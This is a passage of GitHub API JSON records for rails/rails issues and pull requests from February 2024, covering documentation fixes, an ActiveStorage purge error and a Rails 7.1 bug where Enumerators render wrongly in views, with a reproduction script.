        "title": "Action Text Documentation updates [ci skip]",
        "user": {
            "login": "Ridhwana",
            "id": 2786819,
            "node_id": "MDQ6VXNlcjI3ODY4MTk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2786819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Ridhwana",
            "html_url": "https://github.com/Ridhwana",
            "followers_url": "https://api.github.com/users/Ridhwana/followers",
            "following_url": "https://api.github.com/users/Ridhwana/following{/other_user}",
            "gists_url": "https://api.github.com/users/Ridhwana/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Ridhwana/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Ridhwana/subscriptions",
            "organizations_url": "https://api.github.com/users/Ridhwana/orgs",
            "repos_url": "https://api.github.com/users/Ridhwana/repos",
            "events_url": "https://api.github.com/users/Ridhwana/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Ridhwana/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T11:58:48Z",
        "updated_at": "2024-02-01T12:19:52Z",
        "closed_at": "2024-02-01T12:19:52Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50937",
            "html_url": "https://github.com/rails/rails/pull/50937",
            "diff_url": "https://github.com/rails/rails/pull/50937.diff",
            "patch_url": "https://github.com/rails/rails/pull/50937.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nThis Pull Request has been created because we need to update the documentation for Action Text to be more clear and concise. \r\n\r\n### Detail\r\n\r\nThis Pull Request changes the documentation for Action Text.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50937/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50937/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50936",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50936/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50936/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50936/events",
        "html_url": "https://github.com/rails/rails/pull/50936",
        "id": 2112273304,
        "node_id": "PR_kwDNIULOZbAY-Q",
        "number": 50936,
        "title": "Correct error in the document for `query_constraints` [ci-skip]",
        "user": {
            "login": "sato11",
            "id": 22004610,
            "node_id": "MDQ6VXNlcjIyMDA0NjEw",
            "avatar_url": "https://avatars.githubusercontent.com/u/22004610?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sato11",
            "html_url": "https://github.com/sato11",
            "followers_url": "https://api.github.com/users/sato11/followers",
            "following_url": "https://api.github.com/users/sato11/following{/other_user}",
            "gists_url": "https://api.github.com/users/sato11/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sato11/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sato11/subscriptions",
            "organizations_url": "https://api.github.com/users/sato11/orgs",
            "repos_url": "https://api.github.com/users/sato11/repos",
            "events_url": "https://api.github.com/users/sato11/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sato11/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T11:30:09Z",
        "updated_at": "2024-02-01T23:58:35Z",
        "closed_at": "2024-02-01T16:44:43Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50936",
            "html_url": "https://github.com/rails/rails/pull/50936",
            "diff_url": "https://github.com/rails/rails/pull/50936.diff",
            "patch_url": "https://github.com/rails/rails/pull/50936.patch",
            "merged_at": "2024-02-01T16:44:43Z"
        },
        "body": "### Motivation / Background\r\nFound a documentation that did not make sense to me on the first look. The context of this example suggests what it really wants to point to is `query_constraints` instead of `query_by`.\r\n\r\nAlso applied the fixed-width font to the reference to the methods correctly. Since both of these changes belong to the docs of the same method, I have packed them in one commit.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50936/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50936/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50935",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50935/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50935/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50935/events",
        "html_url": "https://github.com/rails/rails/issues/50935",
        "id": 2112256299,
        "node_id": "I_kwDNIULOfeZ5Kw",
        "number": 50935,
        "title": "Add ability to see on which shard the migration is being run",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-01T11:23:15Z",
        "updated_at": "2024-02-05T03:41:35Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Currently, when the app uses sharding and the migration is run, there is not way to tell on which shard it is being run.\r\nThis is a problem, because when the migration adds a unique index and we have some duplicates, the migration blows up (with a `ActiveRecord::RecordNotUnique` error) and there is no way to easily know on which shard exactly. \r\n\r\nThe problem can be solved in at least 2 ways:\r\n1. somehow `puts` shard info when running a migration\r\n2. we have a `connection_pool` object attached to the mentioned `ActiveRecord::RecordNotUnique` error (thanks to https://github.com/rails/rails/pull/48295), but the error message is not include this info (https://github.com/rails/rails/pull/48295#issuecomment-1570702063), so needs to fix that\r\n\r\nI would like to provide a PR, but need a suggestion on which path to choose. \r\n@byroot you helped to implement the linked PR, can you please suggest? ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50935/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50935/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50934",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50934/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50934/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50934/events",
        "html_url": "https://github.com/rails/rails/pull/50934",
        "id": 2112087647,
        "node_id": "PR_kwDNIULOZa2A8g",
        "number": 50934,
        "title": "Refactor QueryCacheTest",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T10:08:54Z",
        "updated_at": "2024-02-01T10:22:57Z",
        "closed_at": "2024-02-01T10:22:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50934",
            "html_url": "https://github.com/rails/rails/pull/50934",
            "diff_url": "https://github.com/rails/rails/pull/50934.diff",
            "patch_url": "https://github.com/rails/rails/pull/50934.patch",
            "merged_at": "2024-02-01T10:22:57Z"
        },
        "body": "In preparation of an upcoming query cache refactor.\r\n\r\nThe main changes is to not test the clear caused by `cached { }` and what's inside the block.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50934/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50934/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50933",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50933/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50933/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50933/events",
        "html_url": "https://github.com/rails/rails/pull/50933",
        "id": 2111678970,
        "node_id": "PR_kwDNIULOZafUoA",
        "number": 50933,
        "title": "[ci skip] [docs] Updated docs to indicate that mysql supports the algorithm",
        "user": {
            "login": "1060ki",
            "id": 18654173,
            "node_id": "MDQ6VXNlcjE4NjU0MTcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/18654173?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/1060ki",
            "html_url": "https://github.com/1060ki",
            "followers_url": "https://api.github.com/users/1060ki/followers",
            "following_url": "https://api.github.com/users/1060ki/following{/other_user}",
            "gists_url": "https://api.github.com/users/1060ki/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/1060ki/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/1060ki/subscriptions",
            "organizations_url": "https://api.github.com/users/1060ki/orgs",
            "repos_url": "https://api.github.com/users/1060ki/repos",
            "events_url": "https://api.github.com/users/1060ki/events{/privacy}",
            "received_events_url": "https://api.github.com/users/1060ki/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T06:45:14Z",
        "updated_at": "2024-02-02T10:06:30Z",
        "closed_at": "2024-02-02T10:02:53Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50933",
            "html_url": "https://github.com/rails/rails/pull/50933",
            "diff_url": "https://github.com/rails/rails/pull/50933.diff",
            "patch_url": "https://github.com/rails/rails/pull/50933.patch",
            "merged_at": "2024-02-02T10:02:53Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because `algorithm` option for create_index is available even if you are using mysql.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes documents for `algorithm` option for  `create_index`. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n https://github.com/rails/rails/blob/4332988337b109f3c63fa2710d8a588d42d1b263/activerecord/lib/active_record/connection_adapters/abstract_mysql_adapter.rb#L189-L196\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50933/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50933/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50932",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50932/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50932/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50932/events",
        "html_url": "https://github.com/rails/rails/issues/50932",
        "id": 2111605159,
        "node_id": "I_kwDNIULOfdyJpw",
        "number": 50932,
        "title": "Rails 7.1 undefined method purge & same for variant using ruby 3.3.0-dev",
        "user": {
            "login": "kashifcodility",
            "id": 157491032,
            "node_id": "U_kgDOCWMfWA",
            "avatar_url": "https://avatars.githubusercontent.com/u/157491032?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kashifcodility",
            "html_url": "https://github.com/kashifcodility",
            "followers_url": "https://api.github.com/users/kashifcodility/followers",
            "following_url": "https://api.github.com/users/kashifcodility/following{/other_user}",
            "gists_url": "https://api.github.com/users/kashifcodility/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kashifcodility/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kashifcodility/subscriptions",
            "organizations_url": "https://api.github.com/users/kashifcodility/orgs",
            "repos_url": "https://api.github.com/users/kashifcodility/repos",
            "events_url": "https://api.github.com/users/kashifcodility/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kashifcodility/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1071962662,
                "node_id": "MDU6TGFiZWwxMDcxOTYyNjYy",
                "url": "https://api.github.com/repos/rails/rails/labels/more-information-needed",
                "name": "more-information-needed",
                "color": "bfdadc",
                "default": false,
                "description": "When reporter needs to provide more information"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-01T05:45:14Z",
        "updated_at": "2024-02-15T10:52:34Z",
        "closed_at": "2024-02-15T10:52:34Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "irb(main):047> image\r\n=> \r\n#<ActiveStorage::Attachment:0x00007ff81133c0a0\r\n id: 4,\r\n name: \"images\",\r\n record_type: \"News\",\r\n record_id: 2,\r\n blob_id: 4,\r\n created_at: Wed, 31 Jan 2024 12:00:01.463996000 UTC +00:00>\r\nirb(main):048> \r\nirb(main):049> \r\nirb(main):050> image.class\r\n=> ActiveStorage::Attachment(id: integer, name: string, record_type: string, record_id: integer, blob_id: integer, created_at: datetime)\r\nirb(main):051> \r\nirb(main):052> \r\nirb(main):053> \r\nirb(main):054> image.purge\r\n/home/lap-053/.rbenv/versions/3.3.0-dev/lib/ruby/gems/3.4.0+0/gems/activemodel-7.1.3/lib/active_model/attribute_methods.rb:489:in `method_missing': undefined method `purge' for an instance of ActiveStorage::Attachment (NoMethodError)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50932/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50932/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50931",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50931/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50931/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50931/events",
        "html_url": "https://github.com/rails/rails/pull/50931",
        "id": 2111507279,
        "node_id": "PR_kwDNIULOZaV7SA",
        "number": 50931,
        "title": "deprecate passing nil as model arg instead of raising ArgumentError",
        "user": {
            "login": "cjilbert504",
            "id": 54157657,
            "node_id": "MDQ6VXNlcjU0MTU3NjU3",
            "avatar_url": "https://avatars.githubusercontent.com/u/54157657?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/cjilbert504",
            "html_url": "https://github.com/cjilbert504",
            "followers_url": "https://api.github.com/users/cjilbert504/followers",
            "following_url": "https://api.github.com/users/cjilbert504/following{/other_user}",
            "gists_url": "https://api.github.com/users/cjilbert504/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/cjilbert504/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/cjilbert504/subscriptions",
            "organizations_url": "https://api.github.com/users/cjilbert504/orgs",
            "repos_url": "https://api.github.com/users/cjilbert504/repos",
            "events_url": "https://api.github.com/users/cjilbert504/events{/privacy}",
            "received_events_url": "https://api.github.com/users/cjilbert504/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-01T04:17:26Z",
        "updated_at": "2024-02-02T01:20:36Z",
        "closed_at": "2024-02-01T21:23:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50931",
            "html_url": "https://github.com/rails/rails/pull/50931",
            "diff_url": "https://github.com/rails/rails/pull/50931.diff",
            "patch_url": "https://github.com/rails/rails/pull/50931.patch",
            "merged_at": "2024-02-01T21:23:03Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because we want to first show a deprecation warning about changing the default value of the `model:` argument to `form_with`\r\n\r\n### Detail\r\n\r\nThis Pull Request removes the changes introduced in #49943 since these changes are breaking changes. Instead we will first deprecate the current default value of the `model:` argument in `form_with`. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50931/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50931/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50930",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50930/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50930/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50930/events",
        "html_url": "https://github.com/rails/rails/issues/50930",
        "id": 2111351021,
        "node_id": "I_kwDNIULOfdio7Q",
        "number": 50930,
        "title": "Rails 7.1 doesn't render Enumerator in view correctly",
        "user": {
            "login": "kuwabarahiroshi",
            "id": 816749,
            "node_id": "MDQ6VXNlcjgxNjc0OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/816749?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kuwabarahiroshi",
            "html_url": "https://github.com/kuwabarahiroshi",
            "followers_url": "https://api.github.com/users/kuwabarahiroshi/followers",
            "following_url": "https://api.github.com/users/kuwabarahiroshi/following{/other_user}",
            "gists_url": "https://api.github.com/users/kuwabarahiroshi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kuwabarahiroshi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kuwabarahiroshi/subscriptions",
            "organizations_url": "https://api.github.com/users/kuwabarahiroshi/orgs",
            "repos_url": "https://api.github.com/users/kuwabarahiroshi/repos",
            "events_url": "https://api.github.com/users/kuwabarahiroshi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kuwabarahiroshi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-01T02:21:08Z",
        "updated_at": "2024-02-09T14:10:29Z",
        "closed_at": "2024-02-09T14:10:29Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Prior to Rails 7.1, returning an Enumerator in a view rendered the content correctly. However, starting from Rails 7.1, it appears to render only the Enumerator's string representation (Enumerator#to_s), resulting in a response like `\"#<Enumerator:0xXXXXXX>\"`.\r\n\r\nSetting `self.response_body = Enumerator.new` in an action works for both 7.0 and 7.1 (fixed in https://github.com/rails/rails/issues/49588).\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  # gem \"rails\", \"~> 7.0.0\" # => works\r\n  gem \"rails\", \"~> 7.1.0\" # => fails\r\nend\r\n\r\nrequire \"action_controller/railtie\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  routes.draw do\r\n    get \"enumerator_in_action\", controller: :test\r\n    get \"enumerator_in_view\", controller: :test\r\n  end\r\nend\r\n\r\nclass TestController < ActionController::Base\r\n  def enumerator_in_action\r\n    self.response_body = Enumerator.new do |buff|\r\n      10.times { buff << _1.to_s }\r\n    end\r\n  end\r\n\r\n  def enumerator_in_view\r\n    render inline: <<~EOS, layout: false, type: :ruby\r\n      Enumerator.new do |buff|\r\n        10.times { buff << _1.to_s }\r\n      end\r\n    EOS\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include Rack::Test::Methods\r\n\r\n  def test_enumerator_in_action\r\n    get \"/enumerator_in_action\"\r\n    assert_equal \"0123456789\", last_response.body\r\n  end\r\n\r\n  def test_enumerator_in_view\r\n    get \"/enumerator_in_view\"\r\n    assert_equal \"0123456789\", last_response.body\r\n  end\r\n\r\n  private\r\n\r\n    def app\r\n      Rails.application\r\n    end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe content should be rendered by evaluating the Enumerator.\r\n\r\nI'm not sure whether it is guaranteed behavior in specification when it's returned from view, but I expect it works as was the case until Rails 7.0.\r\n\r\n### Actual behavior\r\n\r\nIt currently renders the Enumerator's string representation, such as \"#<Enumerator:0xXXXXXX>\".\r\n\r\n### System configuration\r\n**Rails version**: 